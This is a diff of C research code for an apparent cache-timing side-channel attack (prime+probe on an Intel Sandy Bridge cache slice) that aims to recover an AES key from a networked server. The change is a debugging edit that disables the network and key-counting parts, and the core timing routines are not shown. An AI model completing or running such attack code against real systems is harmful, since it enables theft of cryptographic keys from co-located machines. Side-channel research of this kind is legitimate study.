@@ -11,7 +11,7 @@
 
 #define EMPIRICAL_CACHE_ACCESS_TIME 345
 #define REPS 1
-#define CIPHERTEXTS 20000000
+#define CIPHERTEXTS 1000000 //20000000
 
 unsigned long int possible_key_space(int X[16][256]);
 
@@ -30,7 +30,14 @@ int main(int argc, char* argv[])
 
 
     //printf("sandybridge_i5_2435m_setup\n");
-    if (!sandybridge_i5_2435m_setup(0x5c44a2a0)) {
+
+    volatile unsigned long int x = 0;
+    size_t mem_length = (size_t)MB(2);
+    volatile char *F = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
+    F[2048] = 0xAA;
+
+
+    if (!sandybridge_i5_2435m_setup(F)) {       //0x56961540
         printf("[x] Not enough memory could be allocated on required cache-slice, please try again and/or increase hugepages available memory");
         return 0;
     }
@@ -65,31 +72,31 @@ int main(int argc, char* argv[])
 
     for (count = 0; count < CIPHERTEXTS; ++count) {
 
-        min_prob_time = 99999999;
+        //min_prob_time = 99999999;
 
-        //message[0] = '\0';
-        for (i = 0; i < 16; ++i) {
-            message[i] = (unsigned char)rand()%256;
-        }
+        //for (i = 0; i < 16; ++i) {
+        //    message[i] = (unsigned char)rand()%256;
+        //}
 
 
         for (i = 0; i < REPS; ++i) {
-            socket_desc = socket(AF_INET, SOCK_STREAM, 0);
-            if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
+            //socket_desc = socket(AF_INET, SOCK_STREAM, 0);
+            //if (socket_desc == -1) { printf("Could not create socket\n"); return 1; } //printf("socket_desc: %d\n", socket_desc);
             
             //Connect to remote server
-            if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");
+            //if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0) { printf("connection error\n"); return 1; } //printf("Connected\n");
 
             //printf("sandybridge_i5_2435m_prime\n");
-            sandybridge_i5_2435m_prime(); return 0;
+            sandybridge_i5_2435m_prime(); //return 0;
             //printf("sandybridge_i5_2435m_reprime\n");
             sandybridge_i5_2435m_reprime();
 
-            if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
-            if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
+            //if( send(socket_desc , message , 16 , 0) < 0) { puts("Send failed"); return 1; }
+            //if( recv(socket_desc, server_reply , 16 , 0) < 0) { puts("recv failed"); return 1; }
 
+            //x += F[0];
             //printf("sandybridge_i5_2435m_probe\n");
-            prob_time = sandybridge_i5_2435m_probe();
+            prob_time = sandybridge_i5_2435m_probe(); return 0;
 
             //if (prob_time < 360) 
             //    printf("prob_time\t:\t%d\n", prob_time);
@@ -98,11 +105,11 @@ int main(int argc, char* argv[])
                 min_prob_time = prob_time;
             }
 
-            close(socket_desc);
+            //close(socket_desc);
 
         }
 
-        
+        /*
         // if min probe time is less than a threshold increase counters for specific ciphertext
         for (i = 0; i < 16; ++i) {
             if (min_prob_time < EMPIRICAL_CACHE_ACCESS_TIME) {
@@ -114,13 +121,14 @@ int main(int argc, char* argv[])
 
         // Realtime calculation
         if (count % 10000 == 0) {
-            printf("Run %d\n\n", count / 10000);
-            possible_key_space(X);
+            //printf("Run %d\n\n", count / 10000);
+            //possible_key_space(X);
         }
+        */
         
     }
 
-    possible_key_space(X);
+    //possible_key_space(X);
 
 
 
